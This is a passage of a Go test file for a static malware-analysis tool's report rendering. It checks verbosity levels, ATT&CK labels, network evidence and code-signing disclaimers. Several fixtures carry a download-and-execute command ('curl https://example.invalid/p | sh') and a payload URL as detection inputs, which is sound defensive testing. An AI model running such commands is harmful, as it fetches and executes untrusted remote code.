package report

import (
	"errors"
	"fmt"
	"strings"
	"testing"

	"github.com/0x4D31/maratus/internal/artifact"
	"github.com/0x4D31/maratus/internal/behavior"
	"github.com/0x4D31/maratus/internal/rules"
)

func TestWriteTextWithOptionsLayersDetails(t *testing.T) {
	rep := presentationFixture()
	var concise strings.Builder
	if err := WriteTextWithOptions(&concise, rep, TextOptions{}); err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{
		"MARATUS  STATIC ANALYSIS", "Input       sample.app", "Type        app-bundle",
		"SHA-256     " + strings.Repeat("a", 64),
		"Results     2 artifacts · 1 execution root · 0 invoked targets · 1 match across 1 capability",
		"Analysis    1 limited scope; details in canonical JSON or --detail full",
		"ATT&CK (1 technique)", "Ingress Tool Transfer [T1105]",
		"CAPABILITIES (1 capability · 1 match)", "macos.execution", "Downloads and executes a payload",
		"Match status: execution: 1 connected; support: 1 direct",
		"NETWORK EVIDENCE (1 path)", "https://example.invalid/payload", "via curl → libcurl",
		"ARTIFACT PROPERTIES (1 summary)", "1 entitlement across 1 artifact",
	} {
		if !strings.Contains(concise.String(), want) {
			t.Fatalf("concise output missing %q:\n%s", want, concise.String())
		}
	}
	for _, hidden := range []string{
		"Inventory   ", "Provenance  ", "ENTRYPOINTS", "CAPABILITY MATCHES", "ANALYSIS NOTES",
		"rule          macos.download-execute", "support     ", "execution     ", "resource      file: /tmp/payload",
		"chain         downloaded payload invoked", "unresolved    proxy policy", "evidence      ", "ARTIFACT GRAPH", "MODELED OPERATIONS", "FEATURES",
	} {
		if strings.Contains(concise.String(), hidden) {
			t.Fatalf("concise output unexpectedly contains %q:\n%s", hidden, concise.String())
		}
	}
	if strings.Contains(concise.String(), "status      DIRECT · CONNECTED") {
		t.Fatalf("support and execution connectivity should be separate fields:\n%s", concise.String())
	}

	var verbose strings.Builder
	if err := WriteTextWithOptions(&verbose, rep, TextOptions{Verbosity: TextVerbose}); err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{
		"rule          macos.download-execute", "ATT&CK        T1105", "MBC           E1105",
		"about         A statically modeled sequence", "unresolved    proxy policy", "evidence      sample.app/Contents/MacOS/sample",
		"match trace   match.resource_flow.steps[0].operation · operation · operation-1",
	} {
		if !strings.Contains(verbose.String(), want) {
			t.Fatalf("verbose output missing %q:\n%s", want, verbose.String())
		}
	}
	if strings.Contains(verbose.String(), "\nMODELED OPERATIONS") {
		t.Fatalf("verbose output should reserve modeled operations for -vv:\n%s", verbose.String())
	}

	var veryVerbose strings.Builder
	if err := WriteTextWithOptions(&veryVerbose, rep, TextOptions{Verbosity: TextVeryVerbose}); err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{"ARTIFACT GRAPH (2 nodes", "MODELED OPERATIONS (2 operations)", "FEATURES (1 feature)", "command.tool = curl", "support       DIRECT", "execution     CONNECTED"} {
		if !strings.Contains(veryVerbose.String(), want) {
			t.Fatalf("very verbose output missing %q:\n%s", want, veryVerbose.String())
		}
	}
}

func TestConcisePresentationSeparatesGoRuntimeSupport(t *testing.T) {
	rep := Report{
		Artifact: "fixture",
		Operations: []behavior.ModeledOperation{{
			ID: "op-runtime", SubjectNodeID: "node", Kind: behavior.OperationFileOpen,
			Qualifiers: map[string]string{"api": "open", "function_origin": "go-runtime-compiler"}, Support: behavior.SupportCorroborated,
		}},
		Capabilities: []behavior.CapabilityMatch{{
			ID: "cap-runtime", RuleID: "macos.file-open", Title: "Opens filesystem paths", Namespace: "macos.technical.filesystem",
			OperationIDs: []string{"op-runtime"}, Support: behavior.SupportCorroborated, Attack: []string{"T1106"},
		}},
	}
	var output strings.Builder
	if err := WriteTextWithOptions(&output, rep, TextOptions{}); err != nil {
		t.Fatal(err)
	}
	text := output.String()
	for _, want := range []string{"CAPABILITIES (0 capabilities · 0 matches)", "RUNTIME / STANDARD LIBRARY SUPPORT (1 capability · 1 match)", "Bundled compiler runtime or standard-library code"} {
		if !strings.Contains(text, want) {
			t.Fatalf("runtime support output missing %q:\n%s", want, text)
		}
	}
	if strings.Contains(text, "ATT&CK") || strings.Contains(text, "TECHNICAL PRIMITIVES") {
		t.Fatalf("runtime-only inventory leaked into behavioral/technical presentation:\n%s", text)
	}
}

func TestWriteTextWithOptionsLabelsUnresolvedTypedResources(t *testing.T) {
	rep := presentationFixture()
	rep.Capabilities[0].AffectedResources = []behavior.Resource{{Kind: behavior.ResourceFile}}
	rep.Operations[1].ResourceBindings = behavior.Bindings(
		behavior.Bind(behavior.ResourceRoleExecutable, behavior.Resource{Kind: behavior.ResourceFile}),
	)

	var output strings.Builder
	if err := WriteTextWithOptions(&output, rep, TextOptions{Verbosity: TextVeryVerbose}); err != nil {
		t.Fatal(err)
	}
	text := output.String()
	for _, want := range []string{
		"resource      file: (unresolved)",
		"executable    file: (unresolved)",
	} {
		if !strings.Contains(text, want) {
			t.Fatalf("very verbose output missing %q:\n%s", want, text)
		}
	}
}

func TestResourceTextDoesNotLabelSingletonKindUnresolved(t *testing.T) {
	if got := resourceText(behavior.NewResource(behavior.ResourceScreen, "")); got != "screen" {
		t.Fatalf("screen resource text = %q", got)
	}
	if got := resourceText(behavior.NewResource(behavior.ResourceFile, "")); got != "file: (unresolved)" {
		t.Fatalf("unknown file resource text = %q", got)
	}
}

func TestWriteRulesTextIncludesCatalogIdentity(t *testing.T) {
	var output strings.Builder
	info := ListRules()
	if err := WriteRulesText(&output, info, TextOptions{}); err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(output.String(), "Catalog     "+rules.CatalogDigest()) {
		t.Fatalf("rule catalog text omitted its semantic identity:\n%s", output.String())
	}
}

func TestPackageDependencyFeatureIsVisibleInFullText(t *testing.T) {
	rep := Report{
		Artifact:      "package.json",
		ArtifactNodes: []artifact.Node{{ID: "node-1", LogicalPath: "package.json", Kind: "manifest", AnalyzeStatus: "analyzed"}},
		Features: []behavior.Feature{{
			ID:     "feature-1",
			NodeID: "node-1",
			Key:    "package.dependency",
			Value:  "plain-crypto-js",
			Qualifiers: map[string]string{
				"section":   "dependencies",
				"specifier": "4.2.1",
			},
			Support:   behavior.SupportDirect,
			Execution: behavior.ExecutionContext{Connectivity: behavior.ConnectivityUnknown},
		}},
	}

	var output strings.Builder
	if err := WriteTextWithOptions(&output, rep, TextOptions{Verbosity: TextVeryVerbose}); err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{"package.dependency = plain-crypto-js", "section       dependencies", "specifier     4.2.1", "execution     UNKNOWN"} {
		if !strings.Contains(output.String(), want) {
			t.Fatalf("full text omitted dependency detail %q:\n%s", want, output.String())
		}
	}
}

func TestPythonObservationsAreVisibleOnlyInFullText(t *testing.T) {
	rep := Report{
		Artifact:      "fixture.py",
		ArtifactNodes: []artifact.Node{{ID: "node-1", LogicalPath: "fixture.py", Kind: "script", AnalyzeStatus: "analyzed"}},
		Features: []behavior.Feature{
			{
				ID: "feature-import", NodeID: "node-1", Key: "python.import", Value: "torch",
				Qualifiers: map[string]string{"form": "import"}, Support: behavior.SupportDirect,
				Execution: behavior.ExecutionContext{Connectivity: behavior.ConnectivityUnknown},
			},
			{
				ID: "feature-call", NodeID: "node-1", Key: "python.qualified_call", Value: "torch.load",
				Support:   behavior.SupportDirect,
				Execution: behavior.ExecutionContext{Connectivity: behavior.ConnectivityUnknown},
			},
		},
	}

	for _, verbosity := range []TextVerbosity{TextConcise, TextVerbose} {
		var output strings.Builder
		if err := WriteTextWithOptions(&output, rep, TextOptions{Verbosity: verbosity}); err != nil {
			t.Fatal(err)
		}
		if strings.Contains(output.String(), "python.import") || strings.Contains(output.String(), "python.qualified_call") {
			t.Fatalf("generic Python observations leaked into verbosity %d:\n%s", verbosity, output.String())
		}
	}

	var full strings.Builder
	if err := WriteTextWithOptions(&full, rep, TextOptions{Verbosity: TextVeryVerbose}); err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{"python.import = torch", "python.qualified_call = torch.load", "execution     UNKNOWN"} {
		if !strings.Contains(full.String(), want) {
			t.Fatalf("full text omitted Python observation %q:\n%s", want, full.String())
		}
	}
}

func TestPackageDependencyPresentationPrioritizesRuntimeSections(t *testing.T) {
	features := []behavior.Feature{{
		Key: "package.dependency", Value: "runtime-injection",
		Qualifiers: map[string]string{"section": "dependencies", "specifier": "1.0.0"},
		Support:    behavior.SupportDirect,
	}}
	for i := 0; i < textSectionLimit; i++ {
		features = append(features, behavior.Feature{
			Key: "package.dependency", Value: fmt.Sprintf("dev-%03d", i),
			Qualifiers: map[string]string{"section": "devDependencies", "specifier": "1.0.0"},
			Support:    behavior.SupportDirect,
		})
	}

	visible := visibleFeaturesForText(features)
	if len(visible) != textSectionLimit+1 || visible[0].Value != "runtime-injection" {
		t.Fatalf("runtime dependency was not prioritized ahead of development inventory: %#v", visible)
	}
}

func TestPresentationSeparatesRootFromOrderedLoaderTargets(t *testing.T) {
	declared, modeled := 8, 8
	rep := Report{
		Artifact: "renamed.bin",
		ArtifactNodes: []artifact.Node{{
			ID: "carrier", LogicalPath: "renamed.bin", Kind: "macho", AnalyzeStatus: "analyzed",
			PackagingTechnology: "PyInstaller", DeclaredEntryCount: &declared, ModeledEntryCount: &modeled,
		}},
		ExecutionRoots: []behavior.ExecutionRoot{{
			ID: "root", DeclarationNodeID: "carrier", StartNodeID: "carrier", Kind: "executable", Name: "renamed.bin",
		}},
	}
	for ordinal := 0; ordinal < 8; ordinal++ {
		targetID := fmt.Sprintf("target-%02d", ordinal)
		rep.ArtifactNodes = append(rep.ArtifactNodes, artifact.Node{
			ID: targetID, ParentID: "carrier", LogicalPath: fmt.Sprintf("renamed.bin!loader-%02d", ordinal),
			Kind: "python-marshal", AnalyzeStatus: "partial",
		})
	}
	// Deliberately reverse the relationships: presentation order must follow the
	// loader's declared ordinals, not input order or target names.
	for ordinal := 7; ordinal >= 0; ordinal-- {
		value := ordinal
		targetID := fmt.Sprintf("target-%02d", ordinal)
		rep.Relationships = append(rep.Relationships, artifact.Edge{
			From: "carrier", To: targetID, Kind: "loader-invokes", Ordinal: &value,
		})
		rep.InvokedTargets = append(rep.InvokedTargets, behavior.InvokedTarget{
			ID: targetID, Kind: "loader-target", NodeID: targetID,
			Source:    behavior.EntityRef{Kind: behavior.EntityKindExecutionRoot, ID: "root"},
			Execution: testConnectedExecution("root"), Ordinal: &value,
		})
	}
	rep.Relationships = append(rep.Relationships, artifact.Edge{From: "carrier", To: "target-00", Kind: "contains"})

	var output strings.Builder
	if err := WriteTextWithOptions(&output, rep, TextOptions{Verbosity: TextVeryVerbose}); err != nil {
		t.Fatal(err)
	}
	got := output.String()
	for _, want := range []string{
		"Packaging   PyInstaller",
		"Inventory   9 artifact nodes · 1 execution root · 8 invoked targets · 0 capability matches",
		"EXECUTION ROOTS (1 root)", "executable -> renamed.bin",
		"INVOKED TARGETS (8 targets)",
		"packaging     PyInstaller", "declared entries  8", "modeled entries  8",
		"Relationships (8 non-containment relationships)",
		"loader-invokes · renamed.bin → renamed.bin!loader-00 · ordinal 0",
	} {
		if !strings.Contains(got, want) {
			t.Fatalf("facade presentation missing %q:\n%s", want, got)
		}
	}
	prior := -1
	for ordinal := 0; ordinal < 8; ordinal++ {
		want := fmt.Sprintf("loader-target → renamed.bin!loader-%02d (ordinal %d)", ordinal, ordinal)
		index := strings.Index(got, want)
		if index < 0 || index <= prior {
			t.Fatalf("loader target order missing or unstable at ordinal %d:\n%s", ordinal, got)
		}
		prior = index
	}
	if strings.Contains(got, "contains ·") {
		t.Fatalf("containment relationship leaked into bounded relationship details:\n%s", got)
	}
}

func TestPresentationUsesExplicitExecutionRootsAndInvokedTargets(t *testing.T) {
	rep := Report{
		Artifact: "Fixture.app",
		ArtifactNodes: []artifact.Node{
			{ID: "app", LogicalPath: "Fixture.app", Kind: "app-bundle", AnalyzeStatus: "analyzed"},
			{ID: "program", ParentID: "app", LogicalPath: "Fixture.app/app.asar!main.js", Kind: "script", AnalyzeStatus: "analyzed"},
			{ID: "bundle-script", ParentID: "app", LogicalPath: "Fixture.app/Contents/Resources/install.sh", Kind: "script", AnalyzeStatus: "analyzed"},
			{ID: "legacy", ParentID: "app", LogicalPath: "Fixture.app/legacy.sh", Kind: "script", AnalyzeStatus: "analyzed"},
		},
		Relationships: []artifact.Edge{
			{From: "app", To: "bundle-script", Kind: "bundle-script"},
			{From: "app", To: "program", Kind: "program-entry"},
		},
		ExecutionRoots: []behavior.ExecutionRoot{{ID: "root", DeclarationNodeID: "app", StartNodeID: "app", Kind: "application", Name: "Fixture"}},
		InvokedTargets: []behavior.InvokedTarget{
			{ID: "program-target", NodeID: "program", Kind: "program-target", Source: behavior.EntityRef{Kind: behavior.EntityKindExecutionRoot, ID: "root"}, Execution: testConnectedExecution("root"), Arguments: []string{"main.js"}},
			{ID: "bundle-target", NodeID: "bundle-script", Kind: "bundle-script-target", Source: behavior.EntityRef{Kind: behavior.EntityKindArtifactNode, ID: "app"}, Execution: testConnectedExecution("root")},
			{ID: "legacy-target", NodeID: "legacy", Kind: "script-target", Source: behavior.EntityRef{Kind: behavior.EntityKindArtifactNode, ID: "app"}, Execution: testUnknownExecution(), Arguments: []string{"legacy.sh"}},
		},
	}
	var output strings.Builder
	if err := WriteTextWithOptions(&output, rep, TextOptions{Verbosity: TextVerbose}); err != nil {
		t.Fatal(err)
	}
	got := output.String()
	for _, want := range []string{
		"Inventory   4 artifact nodes · 1 execution root · 3 invoked targets",
		"EXECUTION ROOTS (1 root)", "INVOKED TARGETS (3 targets)",
		"program-target → main.js",
		"bundle-script-target → install.sh",
		"script-target → legacy.sh",
	} {
		if !strings.Contains(got, want) {
			t.Fatalf("execution inventory missing %q:\n%s", want, got)
		}
	}
}

func TestVeryVerboseRelationshipDetailsAreBounded(t *testing.T) {
	rep := Report{
		Artifact:      "root",
		ArtifactNodes: []artifact.Node{{ID: "root", LogicalPath: "root", Kind: "directory", AnalyzeStatus: "analyzed"}},
	}
	for index := 0; index < presentationRelationshipLimit+3; index++ {
		rep.Relationships = append(rep.Relationships, artifact.Edge{
			From: "root", To: fmt.Sprintf("target-%02d", index), Kind: "references",
		})
	}
	var output strings.Builder
	if err := WriteTextWithOptions(&output, rep, TextOptions{Verbosity: TextVeryVerbose}); err != nil {
		t.Fatal(err)
	}
	got := output.String()
	if count := strings.Count(got, "    ◆ references ·"); count != presentationRelationshipLimit {
		t.Fatalf("rendered %d relationship details, want %d:\n%s", count, presentationRelationshipLimit, got)
	}
	if !strings.Contains(got, "... 3 more non-containment relationships (use --json for the complete report)") {
		t.Fatalf("bounded relationship output did not disclose omissions:\n%s", got)
	}
}

func TestPackagingTechnologySummaryIsDeterministicAndBounded(t *testing.T) {
	nodes := []artifact.Node{
		{PackagingTechnology: "Technology-G"},
		{PackagingTechnology: "Technology-A"},
		{PackagingTechnology: "Technology-D"},
		{PackagingTechnology: "Technology-C"},
		{PackagingTechnology: "Technology-B"},
		{PackagingTechnology: "Technology-F"},
		{PackagingTechnology: "Technology-E"},
		{PackagingTechnology: "Technology-A"},
	}
	want := "Technology-A, Technology-B, Technology-C, Technology-D, Technology-E, Technology-F · 1 more"
	if got := packagingTechnologySummary(nodes); got != want {
		t.Fatalf("packagingTechnologySummary() = %q, want %q", got, want)
	}
}

func TestWriteTextWithOptionsOmitsAmbiguousMultiRootSHA256(t *testing.T) {
	rep := Report{
		Artifact: "python README.md",
		ArtifactNodes: []artifact.Node{
			{ID: "node-command", LogicalPath: "<command>", Kind: "command", AnalyzeStatus: "analyzed"},
			{ID: "node-target", LogicalPath: "README.md", Kind: "text", SHA256: strings.Repeat("b", 64), AnalyzeStatus: "analyzed"},
		},
	}
	var output strings.Builder
	if err := WriteTextWithOptions(&output, rep, TextOptions{}); err != nil {
		t.Fatal(err)
	}
	if strings.Contains(output.String(), "SHA-256") || strings.Contains(output.String(), strings.Repeat("b", 64)) {
		t.Fatalf("multi-root report attributed a resolved target hash to the command target:\n%s", output.String())
	}
	if !strings.Contains(output.String(), "Input       python README.md") {
		t.Fatalf("multi-root report replaced the user-supplied target with one root:\n%s", output.String())
	}
}

func TestConciseAttackSectionIsBounded(t *testing.T) {
	rep := Report{Artifact: "sample"}
	for index := 0; index < conciseAttackLimit+6; index++ {
		rep.Capabilities = append(rep.Capabilities, behavior.CapabilityMatch{
			RuleID: fmt.Sprintf("fixture.rule-%02d", index), Title: fmt.Sprintf("Fixture %02d", index), Namespace: "fixture",
			Attack: []string{fmt.Sprintf("T9%03d", index)}, Support: behavior.SupportCorroborated, Execution: testUnknownExecution(),
		})
	}
	var output strings.Builder
	if err := WriteTextWithOptions(&output, rep, TextOptions{}); err != nil {
		t.Fatal(err)
	}
	got := output.String()
	if !strings.Contains(got, "ATT&CK (30 techniques)") || !strings.Contains(got, "... 6 more techniques") {
		t.Fatalf("bounded ATT&CK output did not disclose omissions:\n%s", got)
	}
}

func TestConciseAttackMetadataIsAccurateAndUnknownIDsRemainNeutral(t *testing.T) {
	rep := Report{Artifact: "sample", Capabilities: []behavior.CapabilityMatch{
		{RuleID: "fixture.permissions", Title: "Permissions", Namespace: "fixture", Attack: []string{"T1222.002"}, Support: behavior.SupportCorroborated, Execution: testUnknownExecution()},
		{RuleID: "fixture.unknown", Title: "Unknown", Namespace: "fixture", Attack: []string{"T9999.999"}, Support: behavior.SupportCorroborated, Execution: testUnknownExecution()},
	}}
	var output strings.Builder
	if err := WriteTextWithOptions(&output, rep, TextOptions{}); err != nil {
		t.Fatal(err)
	}
	got := output.String()
	if !strings.Contains(got, "DEFENSE EVASION") || !strings.Contains(got, "Linux and Mac Permissions [T1222.002]") || !strings.Contains(got, "T9999.999") {
		t.Fatalf("ATT&CK presentation lost stable or known metadata:\n%s", got)
	}
	for _, misleading := range []string{"DEFENSE IMPAIRMENT", "OTHER", "Uncatalogued"} {
		if strings.Contains(got, misleading) {
			t.Fatalf("ATT&CK presentation invented or retained misleading label %q:\n%s", misleading, got)
		}
	}
}

func TestConciseMatchStatusCountsExecutionConnectivity(t *testing.T) {
	matches := []behavior.CapabilityMatch{
		{Support: behavior.SupportCorroborated, Execution: testConnectedExecution("")},
		{Support: behavior.SupportCorroborated, Execution: testConnectedExecution("")},
	}
	if got := conciseMatchStatus(matches); got != "execution: 2 connected; support: 2 corroborated" {
		t.Fatalf("concise match status = %q", got)
	}
}

func TestWriteTextWithOptionsReportsCapabilityDisplayLimitHonestly(t *testing.T) {
	rep := Report{
		Artifact:      "sample",
		ArtifactNodes: []artifact.Node{{ID: "node-root", LogicalPath: "sample", Kind: "file", AnalyzeStatus: "analyzed"}},
	}
	for index := 0; index < 30; index++ {
		rep.Capabilities = append(rep.Capabilities, behavior.CapabilityMatch{
			ID: fmt.Sprintf("capability-%02d", index), RuleID: fmt.Sprintf("fixture.rule-%02d", index), Title: fmt.Sprintf("Fixture match %02d", index), Namespace: "fixture",
			SubjectNodeID: fmt.Sprintf("node-%02d", index), Support: behavior.SupportCorroborated, Execution: testConnectedExecution(""),
		})
	}
	for index := 0; index < 10; index++ {
		duplicate := rep.Capabilities[index]
		duplicate.ID = fmt.Sprintf("capability-duplicate-%02d", index)
		rep.Capabilities = append(rep.Capabilities, duplicate)
	}

	var output strings.Builder
	if err := WriteTextWithOptions(&output, rep, TextOptions{}); err != nil {
		t.Fatal(err)
	}
	got := output.String()
	if !strings.Contains(got, "CAPABILITIES (30 capabilities · 40 matches)") || !strings.Contains(got, "Fixture match 00 (2 matches)") || !strings.Contains(got, "... 6 more capabilities") {
		t.Fatalf("bounded capability count is inaccurate:\n%s", got)
	}
}

func TestWriteTextWithOptionsShowsHonestExecutionRootAndFeatureCounts(t *testing.T) {
	rep := Report{
		Artifact: "curl https://example.invalid/p | sh",
		ArtifactNodes: []artifact.Node{{
			ID: "node-1", LogicalPath: "<command>", Kind: "command", MediaType: "text/plain", AnalyzeStatus: "analyzed",
		}},
		ExecutionRoots: []behavior.ExecutionRoot{
			{Kind: "command", Name: "curl", Arguments: []string{"curl https://example.invalid/p | sh"}},
			{Kind: "document-handler", Name: "public.jpeg"},
			{Kind: "document-handler", Name: "public.png"},
		},
		Features: []behavior.Feature{
			{Key: "command.tool", Value: "curl", Support: behavior.SupportDirect},
			{Key: "command.pipe", Value: "sh", Support: behavior.SupportCorroborated},
		},
	}
	var output strings.Builder
	if err := WriteTextWithOptions(&output, rep, TextOptions{Verbosity: TextVeryVerbose}); err != nil {
		t.Fatal(err)
	}
	got := output.String()
	for _, want := range []string{
		"Input       curl https://example.invalid/p | sh",
		"Inventory   1 artifact node · 3 execution roots · 0 invoked targets",
		"EXECUTION ROOTS (3 roots)",
		"document-handler -> 2 registered document types",
		"FEATURES (1 shown · 2 retained)",
		"... 1 lower-priority Features omitted",
	} {
		if !strings.Contains(got, want) {
			t.Fatalf("presentation missing %q:\n%s", want, got)
		}
	}
}

func TestWriteTextWithOptionsKeepsFeaturesFromDifferentSources(t *testing.T) {
	rep := Report{
		Artifact: "Sample.app",
		ArtifactNodes: []artifact.Node{
			{ID: "node-1", LogicalPath: "Sample.app/Contents/MacOS/Sample", Kind: "macho", AnalyzeStatus: "analyzed"},
			{ID: "node-2", LogicalPath: "Sample.app/Contents/Helpers/Helper", Kind: "macho", AnalyzeStatus: "analyzed"},
		},
		Features: []behavior.Feature{
			{ID: "sig-1", NodeID: "node-1", ScopeID: "scope-1", Key: "command.tool", Value: "curl", Support: behavior.SupportDirect, Qualifiers: map[string]string{"architecture": "arm64"}, EvidenceIDs: []string{"ev-1"}},
			{ID: "sig-2", NodeID: "node-2", ScopeID: "scope-2", Key: "command.tool", Value: "curl", Support: behavior.SupportDirect, Qualifiers: map[string]string{"architecture": "arm64"}, EvidenceIDs: []string{"ev-2"}},
		},
		Evidence: []behavior.Evidence{
			{ID: "ev-1", NodeID: "node-1", Logical: "Sample.app/Contents/MacOS/Sample", Method: "test", Kind: "command", Value: "curl"},
			{ID: "ev-2", NodeID: "node-2", Logical: "Sample.app/Contents/Helpers/Helper", Method: "test", Kind: "command", Value: "curl"},
		},
	}

	var output strings.Builder
	if err := WriteTextWithOptions(&output, rep, TextOptions{Verbosity: TextVeryVerbose}); err != nil {
		t.Fatal(err)
	}
	got := output.String()
	for _, want := range []string{
		"FEATURES (2 features)",
		"source        Sample",
		"source        Helper",
		"architecture  arm64",
		"evidence      Sample.app/Contents/MacOS/Sample",
		"evidence      Sample.app/Contents/Helpers/Helper",
	} {
		if !strings.Contains(got, want) {
			t.Fatalf("source-aware feature output missing %q:\n%s", want, got)
		}
	}
}

func TestFeaturePresentationDistinguishesSourceFunctionAndRawSymbol(t *testing.T) {
	rep := Report{
		Artifact:      "Sample",
		ArtifactNodes: []artifact.Node{{ID: "node-1", LogicalPath: "Sample", Kind: "macho", AnalyzeStatus: "analyzed"}},
		Features: []behavior.Feature{{
			NodeID: "node-1", Key: "macho.import_call", Value: "curl_easy_perform",
			SourceFunction: "sendFile()", Qualifiers: map[string]string{"function": "_Z8sendFilev"},
			Support: behavior.SupportCorroborated,
		}},
	}
	var output strings.Builder
	if err := WriteTextWithOptions(&output, rep, TextOptions{Verbosity: TextVeryVerbose}); err != nil {
		t.Fatal(err)
	}
	got := output.String()
	for _, want := range []string{"source functionsendFile()", "symbol      _Z8sendFilev"} {
		if !strings.Contains(strings.ReplaceAll(got, " ", ""), strings.ReplaceAll(want, " ", "")) {
			t.Fatalf("feature function labels missing %q:\n%s", want, got)
		}
	}
}

func TestAnalysisSummaryReportsZIPPasswordPresence(t *testing.T) {
	got := analysisSummary(AnalysisMetadata{Architecture: "all", ZipPasswordSupplied: true})
	if !strings.Contains(got, "ZIP password supplied") {
		t.Fatalf("analysis summary omits coverage-affecting ZIP password provenance: %q", got)
	}
}

func TestWriteTextWithOptionsShowsArtifactPropertyEvidenceAtVerbose(t *testing.T) {
	rep := Report{
		Artifact:      "Sample",
		ArtifactNodes: []artifact.Node{{ID: "node-1", LogicalPath: "Sample", Kind: "macho", AnalyzeStatus: "analyzed"}},
		ArtifactProperties: []behavior.ArtifactProperty{{
			NodeID: "node-1", Kind: "entitlement", Value: "com.apple.security.network.client",
			Support: behavior.SupportDirect, EvidenceIDs: []string{"ev-1"},
		}},
		Evidence: []behavior.Evidence{{
			ID: "ev-1", NodeID: "node-1", Logical: "Sample", Method: "code-signature", Kind: "entitlement", Value: "com.apple.security.network.client",
		}},
	}

	var concise strings.Builder
	if err := WriteTextWithOptions(&concise, rep, TextOptions{}); err != nil {
		t.Fatal(err)
	}
	if strings.Contains(concise.String(), "evidence      ") {
		t.Fatalf("concise artifact property should not print evidence:\n%s", concise.String())
	}
	var verbose strings.Builder
	if err := WriteTextWithOptions(&verbose, rep, TextOptions{Verbosity: TextVerbose}); err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(verbose.String(), "evidence      Sample") {
		t.Fatalf("verbose artifact property evidence missing:\n%s", verbose.String())
	}
}

func TestWriteTextWithOptionsQualifiesCodeSigningArtifactProperty(t *testing.T) {
	const disclaimer = "CMS signatures, certificate trust, notarization, and revocation are not verified."
	for _, kind := range []string{"code-signature-structure", "code-directory-identifier", "cms-signature-structure", "entitlement", "entitlements-xml"} {
		t.Run(kind, func(t *testing.T) {
			rep := Report{
				Artifact: "Sample",
				ArtifactProperties: []behavior.ArtifactProperty{{
					Kind: kind, Value: "present", Support: behavior.SupportDirect,
				}},
			}
			var output strings.Builder
			if err := WriteTextWithOptions(&output, rep, TextOptions{}); err != nil {
				t.Fatal(err)
			}
			if count := strings.Count(output.String(), disclaimer); count != 1 {
				t.Fatalf("code-signing disclaimer printed %d times:\n%s", count, output.String())
			}
		})
	}
}

func TestWriteTextWithOptionsPrintsCodeSigningDisclaimerOncePerSection(t *testing.T) {
	const disclaimer = "CMS signatures, certificate trust, notarization, and revocation are not verified."
	rep := Report{
		Artifact: "Sample",
		ArtifactProperties: []behavior.ArtifactProperty{
			{Kind: "code-signature-structure", Value: "present", Support: behavior.SupportDirect},
			{Kind: "code-directory-identifier", Value: "com.example.Sample", Support: behavior.SupportDirect},
			{Kind: "entitlement", Value: "com.apple.security.network.client", Support: behavior.SupportDirect},
		},
	}
	var output strings.Builder
	if err := WriteTextWithOptions(&output, rep, TextOptions{Verbosity: TextVeryVerbose}); err != nil {
		t.Fatal(err)
	}
	if count := strings.Count(output.String(), disclaimer); count != 1 {
		t.Fatalf("code-signing disclaimer printed %d times:\n%s", count, output.String())
	}
}

func TestWriteTextWithOptionsOmitsCodeSigningDisclaimerForUnrelatedContext(t *testing.T) {
	rep := Report{
		Artifact: "Sample",
		ArtifactProperties: []behavior.ArtifactProperty{{
			Kind: "sandbox-profile", Value: "present", Support: behavior.SupportDirect,
		}},
	}
	var output strings.Builder
	if err := WriteTextWithOptions(&output, rep, TextOptions{}); err != nil {
		t.Fatal(err)
	}
	if strings.Contains(output.String(), "CMS signatures, certificate trust") {
		t.Fatalf("unrelated artifact property received a code-signing disclaimer:\n%s", output.String())
	}
}

func TestConciseArtifactPropertiesExposeSigningIntegrityWithoutClaimingTrust(t *testing.T) {
	rep := Report{Artifact: "Sample", ArtifactProperties: []behavior.ArtifactProperty{
		{NodeID: "node-1", Kind: "code-signature-structure", Value: "present", Support: behavior.SupportDirect},
		{NodeID: "node-1", Kind: "code-directory-page-integrity", Value: "invalid", Support: behavior.SupportDirect},
		{NodeID: "node-1", Kind: "cms-signature-structure", Value: "signed-data-envelope", Support: behavior.SupportDirect},
	}}
	var output strings.Builder
	if err := WriteTextWithOptions(&output, rep, TextOptions{}); err != nil {
		t.Fatal(err)
	}
	got := output.String()
	for _, want := range []string{"CodeDirectory page integrity: invalid", "CMS SignedData envelope present", "CodeDirectory page hashes cover retained bytes only", "CMS signatures, certificate trust"} {
		if !strings.Contains(got, want) {
			t.Fatalf("concise signing summary missing %q:\n%s", want, got)
		}
	}
	for _, forbidden := range []string{"signature trusted", "notarization valid", "certificate valid"} {
		if strings.Contains(strings.ToLower(got), forbidden) {
			t.Fatalf("concise signing summary overclaimed %q:\n%s", forbidden, got)
		}
	}
}

func TestConciseArtifactPropertyGroupsStructuralMetadata(t *testing.T) {
	items := []behavior.ArtifactProperty{
		{Kind: "code-signature-structure", Value: "present", Support: behavior.SupportDirect},
		{Kind: "code-signature-structure", Value: "alternate", Support: behavior.SupportDirect},
		{Kind: "entitlement-context", Value: "debuggable", Support: behavior.SupportDirect},
		{Kind: "entitlement", Value: "com.apple.security.get-task-allow", Support: behavior.SupportDirect},
		{Kind: "code-signature-flags", Value: "0x2", Support: behavior.SupportDirect},
		{Kind: "sandbox-profile", Value: "present", Support: behavior.SupportDirect},
	}
	for i := 0; i < 6; i++ {
		items = append(items, behavior.ArtifactProperty{Kind: "code-directory-identifier", Value: fmt.Sprintf("component-%d", i), Support: behavior.SupportDirect})
	}
	rep := Report{Artifact: "Sample", ArtifactProperties: items}

	var concise strings.Builder
	if err := WriteTextWithOptions(&concise, rep, TextOptions{}); err != nil {
		t.Fatal(err)
	}
	text := concise.String()
	for _, want := range []string{"ARTIFACT PROPERTIES (4 summaries)", "debuggable", "sandbox-profile: present", "1 entitlement", "code-signature structure present"} {
		if !strings.Contains(text, want) {
			t.Fatalf("concise artifact-property summary missing %q:\n%s", want, text)
		}
	}
	if strings.Contains(text, "code-directory-identifier:") {
		t.Fatalf("concise artifact-property count/omission is unclear:\n%s", text)
	}
	if contextAt, structureAt := strings.Index(text, "debuggable"), strings.Index(text, "code-signature structure present"); contextAt < 0 || structureAt < 0 || contextAt > structureAt {
		t.Fatalf("concise output did not prioritize interpretive context:\n%s", text)
	}

	var verbose strings.Builder
	if err := WriteTextWithOptions(&verbose, rep, TextOptions{Verbosity: TextVerbose}); err != nil {
		t.Fatal(err)
	}
	if strings.Contains(verbose.String(), "more artifact-property items") || strings.Count(verbose.String(), "code-directory-identifier:") != 6 {
